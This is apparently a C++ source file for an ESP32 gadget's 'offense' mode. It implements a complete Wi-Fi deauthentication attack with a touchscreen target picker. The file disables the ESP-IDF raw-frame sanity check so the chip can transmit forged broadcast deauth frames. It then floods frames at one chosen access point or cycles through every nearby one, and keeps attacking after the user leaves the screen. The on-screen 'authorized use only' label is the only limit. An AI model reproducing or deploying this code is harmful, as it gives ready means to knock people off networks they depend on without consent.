#include "deauth_attack.h"
#include "offense_wifi.h"
#include "wifi_beacon_manager.h"
#include "argus_mode.h"
#include "theme.h"
#include <lvgl.h>
#include <string.h>
#include <stdio.h>

// Defined in tools_screen.cpp / main.cpp
void tools_screen_show();
void low_mem_show_dialog(const char *msg);

// Raw-frame sanity-check override: stock ESP-IDF rejects deauth/disassoc via
// esp_wifi_80211_tx. This weak-symbol override (allowed to win via the
// -Wl,--allow-multiple-definition link flag) disables the check so raw mgmt
// injection is permitted. Verified working on this core (frames transmit).
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

// ---- phases ----------------------------------------------------------------
enum DaPhase { DA_IDLE, DA_SURVEY, DA_PICK, DA_ARM, DA_INJECT };
static DaPhase s_phase = DA_IDLE;

struct Target { uint8_t bssid[6]; uint8_t channel; int8_t rssi; char ssid[33]; };
#define DA_MAX_TARGETS 32
static Target   s_targets[DA_MAX_TARGETS];
static int      s_target_n = 0;
static uint32_t s_frames   = 0;
static int      s_inject_i = 0;
static int      s_sel      = -1;   // -1 = all APs, >=0 = a single target index

static lv_timer_t *s_survey_end = nullptr;
static lv_timer_t *s_arm        = nullptr;
static int         s_arm_tries  = 0;
static lv_timer_t *s_inject     = nullptr;

static const uint32_t SURVEY_MS = 4000;

// ---- survey ----------------------------------------------------------------
static void survey_cb(const WifiBeacon *b)
{
    if (!b || s_target_n >= DA_MAX_TARGETS) return;
    for (int i = 0; i < s_target_n; i++) {
        if (memcmp(s_targets[i].bssid, b->bssid, 6) == 0) {
            if (b->rssi > s_targets[i].rssi) s_targets[i].rssi = b->rssi;   // keep strongest
            return;
        }
    }
    Target &t = s_targets[s_target_n];
    memcpy(t.bssid, b->bssid, 6);
    t.channel = b->channel ? b->channel : 1;
    t.rssi    = b->rssi;
    strncpy(t.ssid, b->ssid, sizeof(t.ssid) - 1);
    t.ssid[sizeof(t.ssid) - 1] = '\0';
    s_target_n++;
}

static int build_deauth(uint8_t *buf, const uint8_t *bssid)
{
    int i = 0;
    buf[i++] = 0xC0; buf[i++] = 0x00;                 // FC: deauth
    buf[i++] = 0x00; buf[i++] = 0x00;                 // duration
    for (int k = 0; k < 6; k++) buf[i++] = 0xFF;      // DA: broadcast (all clients)
    for (int k = 0; k < 6; k++) buf[i++] = bssid[k];  // SA: AP
    for (int k = 0; k < 6; k++) buf[i++] = bssid[k];  // BSSID: AP
    buf[i++] = 0x00; buf[i++] = 0x00;                 // seq
    buf[i++] = 0x07; buf[i++] = 0x00;                 // reason 7
    return i;
}

static void inject_tick(lv_timer_t *)
{
    if (s_target_n == 0) return;
    Target *t;
    if (s_sel >= 0 && s_sel < s_target_n) {
        t = &s_targets[s_sel];                        // single target: pin its channel
    } else {
        t = &s_targets[s_inject_i];                   // all: cycle through them
        s_inject_i = (s_inject_i + 1) % s_target_n;
    }
    offense_wifi_set_channel(t->channel);
    uint8_t frame[26];
    int len = build_deauth(frame, t->bssid);
    for (int r = 0; r < 3; r++)
        if (offense_wifi_tx(frame, (size_t)len)) s_frames++;
}

// Retry the WiFi claim until the threat pipeline's beacon piggyback releases it.
static void arm_inject(lv_timer_t *t)
{
    if (offense_wifi_claim(1, "Deauther")) {
        lv_timer_del(t); s_arm = nullptr;
        s_phase    = DA_INJECT;
        s_inject_i = 0;
        s_inject   = lv_timer_create(inject_tick, 25, nullptr);
        return;
    }
    if (++s_arm_tries > 10) { lv_timer_del(t); s_arm = nullptr; deauth_attack_stop(); }
}

static void end_survey(lv_timer_t *t)
{
    lv_timer_del(t); s_survey_end = nullptr;
    wifi_beacon_remove(survey_cb);
    s_phase = DA_PICK;   // show the target list; wait for the user to pick
}

bool deauth_attack_start()
{
    if (s_phase != DA_IDLE) return true;
    if (offense_wifi_held()) return false;            // another offense tool holds WiFi
    s_target_n = 0; s_frames = 0; s_inject_i = 0; s_sel = -1;
    if (!wifi_beacon_add(survey_cb)) return false;    // e.g. BLE up
    s_phase = DA_SURVEY;
    s_survey_end = lv_timer_create(end_survey, SURVEY_MS, nullptr);
    lv_timer_set_repeat_count(s_survey_end, 1);
    return true;
}

// Pick a target (-1 = all APs, else the target index) and start injecting.
static void deauth_select(int sel)
{
    if (s_phase != DA_PICK) return;
    s_sel       = sel;
    s_phase     = DA_ARM;
    s_arm_tries = 0;
    s_arm       = lv_timer_create(arm_inject, 500, nullptr);
}

void deauth_attack_stop()
{
    if (s_survey_end) { lv_timer_del(s_survey_end); s_survey_end = nullptr; }
    if (s_arm)        { lv_timer_del(s_arm);        s_arm = nullptr; }
    if (s_inject)     { lv_timer_del(s_inject);     s_inject = nullptr; }
    wifi_beacon_remove(survey_cb);   // no-op if already removed
    offense_wifi_release();
    s_phase = DA_IDLE;
}

bool deauth_attack_is_running()  { return s_phase != DA_IDLE; }
int  deauth_attack_target_count(){ return s_target_n; }
uint32_t deauth_attack_frames()  { return s_frames; }

// ---- screen ----------------------------------------------------------------
static lv_obj_t *da_screen;
static lv_obj_t *da_toggle_lbl;
static lv_obj_t *da_toggle_btn;
static lv_obj_t *da_status;    // status line (idle / surveying / arming / injecting)
static lv_obj_t *da_list;      // AP picker list (shown only in DA_PICK)
static lv_timer_t *da_ui;
static DaPhase   da_last_phase = DA_IDLE;

static void da_add_pick_row(const char *text, int sel)
{
    lv_obj_t *row = lv_button_create(da_list);
    lv_obj_set_width(row, lv_pct(100));
    lv_obj_set_height(row, 44);
    lv_obj_set_style_radius(row, 8, LV_PART_MAIN);
    lv_obj_set_style_bg_color(row, lv_color_make(0x22, 0x18, 0x0C), LV_PART_MAIN);
    lv_obj_set_style_border_color(row, ARGUS_OFFENSE_ACCENT, LV_PART_MAIN);
    lv_obj_set_style_border_width(row, 1, LV_PART_MAIN);
    lv_obj_set_user_data(row, (void *)(intptr_t)sel);
    lv_obj_add_event_cb(row, [](lv_event_t *e) {
        int sel = (int)(intptr_t)lv_obj_get_user_data((lv_obj_t *)lv_event_get_target(e));
        deauth_select(sel);
    }, LV_EVENT_CLICKED, NULL);
    lv_obj_t *l = lv_label_create(row);
    lv_obj_set_style_text_font(l, &font_argus_label_16, LV_PART_MAIN);
    lv_obj_set_style_text_color(l, ARGUS_TEXT, LV_PART_MAIN);
    lv_label_set_text(l, text);
    lv_obj_center(l);
}

static void da_build_list()
{
    lv_obj_clean(da_list);
    da_add_pick_row("DEAUTH ALL", -1);
    for (int i = 0; i < s_target_n; i++) {
        char t[64];
        const char *nm = s_targets[i].ssid[0] ? s_targets[i].ssid : "<hidden>";
        snprintf(t, sizeof(t), "%s   %d dBm", nm, (int)s_targets[i].rssi);
        da_add_pick_row(t, i);
    }
    if (s_target_n == 0) {
        lv_obj_t *l = lv_label_create(da_list);
        lv_obj_set_style_text_font(l, &font_argus_label_16, LV_PART_MAIN);
        lv_obj_set_style_text_color(l, ARGUS_TEXT_DIM, LV_PART_MAIN);
        lv_label_set_text(l, "No APs found - try again");
        lv_obj_center(l);
    }
}

static void da_refresh(lv_timer_t *)
{
    if (!deauth_attack_screen_is_active()) return;

    // Rebuild the picker list exactly once when we enter the PICK phase.
    if (s_phase == DA_PICK && da_last_phase != DA_PICK) da_build_list();
    da_last_phase = s_phase;

    bool picking = (s_phase == DA_PICK);
    if (picking) lv_obj_clear_flag(da_list, LV_OBJ_FLAG_HIDDEN);
    else         lv_obj_add_flag(da_list, LV_OBJ_FLAG_HIDDEN);

    lv_label_set_text(da_toggle_lbl, (s_phase == DA_IDLE) ? "START" : "STOP");
    lv_obj_set_style_bg_color(da_toggle_btn,
        (s_phase == DA_IDLE) ? lv_color_make(0x00, 0xAA, 0x44) : HADES_RED, LV_PART_MAIN);

    char b[72];
    switch (s_phase) {
    case DA_IDLE:   lv_label_set_text(da_status, "idle"); break;
    case DA_SURVEY: snprintf(b, sizeof(b), "surveying... %d APs", s_target_n); lv_label_set_text(da_status, b); break;
    case DA_PICK:   lv_label_set_text(da_status, "pick a target"); break;
    case DA_ARM:    lv_label_set_text(da_status, "arming..."); break;
    case DA_INJECT:
        if (s_sel >= 0 && s_sel < s_target_n) {
            const char *nm = s_targets[s_sel].ssid[0] ? s_targets[s_sel].ssid : "<hidden>";
            snprintf(b, sizeof(b), "%s\n%lu frames", nm, (unsigned long)s_frames);
        } else {
            snprintf(b, sizeof(b), "ALL (%d)   %lu frames", s_target_n, (unsigned long)s_frames);
        }
        lv_label_set_text(da_status, b);
        break;
    }
}

static void da_on_toggle(lv_event_t *)
{
    if (deauth_attack_is_running()) deauth_attack_stop();
    else if (!deauth_attack_start()) {
        const char *why = offense_wifi_busy_reason();
        low_mem_show_dialog(why ? why : "Can't start. Turn Bluetooth off\nand stop other WiFi tools, then retry.");
        return;
    }
    da_refresh(nullptr);
}

// Leaving the screen does NOT stop the attack - it keeps injecting so you can
// navigate; the single-owner guard + the busy dialog handle a second tool.
static void da_on_gesture(lv_event_t *e)
{
    lv_indev_t *indev = lv_event_get_indev(e);
    if (lv_indev_get_gesture_dir(indev) == LV_DIR_RIGHT) tools_screen_show();
}

void deauth_attack_screen_create()
{
    da_screen = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(da_screen, lv_color_black(), LV_PART_MAIN);
    lv_obj_set_style_border_width(da_screen, 0, LV_PART_MAIN);

    lv_obj_t *title = lv_label_create(da_screen);
    lv_obj_set_style_text_color(title, ARGUS_OFFENSE_ACCENT, LV_PART_MAIN);
    lv_obj_set_style_text_font(title, &font_argus_label_28, LV_PART_MAIN);
    lv_label_set_text(title, "DEAUTH");
    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 16);

    lv_obj_t *warn = lv_label_create(da_screen);
    lv_obj_set_style_text_color(warn, HADES_RED, LV_PART_MAIN);
    lv_obj_set_style_text_font(warn, &font_argus_label_14, LV_PART_MAIN);
    lv_obj_set_style_text_align(warn, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_obj_set_width(warn, 380);
    lv_label_set_long_mode(warn, LV_LABEL_LONG_WRAP);
    lv_label_set_text(warn, "AUTHORIZED USE ONLY - disconnects clients from the APs you pick.");
    lv_obj_align(warn, LV_ALIGN_TOP_MID, 0, 54);

    // Picker list (shown only while choosing a target).
    da_list = lv_obj_create(da_screen);
    lv_obj_set_size(da_list, 404, 300);
    lv_obj_align(da_list, LV_ALIGN_TOP_MID, 0, 92);
    lv_obj_set_style_bg_color(da_list, lv_color_black(), LV_PART_MAIN);
    lv_obj_set_style_border_width(da_list, 0, LV_PART_MAIN);
    lv_obj_set_style_pad_all(da_list, 4, LV_PART_MAIN);
    lv_obj_set_style_pad_row(da_list, 6, LV_PART_MAIN);
    lv_obj_set_layout(da_list, LV_LAYOUT_FLEX);
    lv_obj_set_flex_flow(da_list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_scroll_dir(da_list, LV_DIR_VER);
    lv_obj_set_scrollbar_mode(da_list, LV_SCROLLBAR_MODE_AUTO);
    lv_obj_add_flag(da_list, LV_OBJ_FLAG_HIDDEN);

    da_status = lv_label_create(da_screen);
    lv_obj_set_style_text_color(da_status, lv_color_make(0x3C, 0xDC, 0x78), LV_PART_MAIN);
    lv_obj_set_style_text_font(da_status, &font_argus_label_20, LV_PART_MAIN);
    lv_obj_set_style_text_align(da_status, LV_TEXT_ALIGN_CENTER, LV_PART_MAIN);
    lv_label_set_text(da_status, "idle");
    lv_obj_align(da_status, LV_ALIGN_CENTER, 0, 10);

    da_toggle_btn = lv_button_create(da_screen);
    lv_obj_set_size(da_toggle_btn, 200, 66);
    lv_obj_align(da_toggle_btn, LV_ALIGN_BOTTOM_MID, 0, -20);
    lv_obj_set_style_radius(da_toggle_btn, 12, LV_PART_MAIN);
    lv_obj_set_style_bg_color(da_toggle_btn, lv_color_make(0x00, 0xAA, 0x44), LV_PART_MAIN);
    lv_obj_add_event_cb(da_toggle_btn, da_on_toggle, LV_EVENT_CLICKED, NULL);
    da_toggle_lbl = lv_label_create(da_toggle_btn);
    lv_obj_set_style_text_color(da_toggle_lbl, lv_color_white(), LV_PART_MAIN);
    lv_obj_set_style_text_font(da_toggle_lbl, &font_argus_label_28, LV_PART_MAIN);
    lv_label_set_text(da_toggle_lbl, "START");
    lv_obj_center(da_toggle_lbl);

    lv_obj_add_event_cb(da_screen, da_on_gesture, LV_EVENT_GESTURE, NULL);

    da_ui = lv_timer_create(da_refresh, 400, NULL);
    lv_timer_pause(da_ui);
}

void deauth_attack_screen_show()
{
    if (argus_mode_current() != ArgusMode::Offense) { tools_screen_show(); return; }
    da_last_phase = DA_IDLE;
    da_refresh(nullptr);
    lv_timer_resume(da_ui);
    lv_scr_load(da_screen);
}

bool deauth_attack_screen_is_active() { return lv_screen_active() == da_screen; }
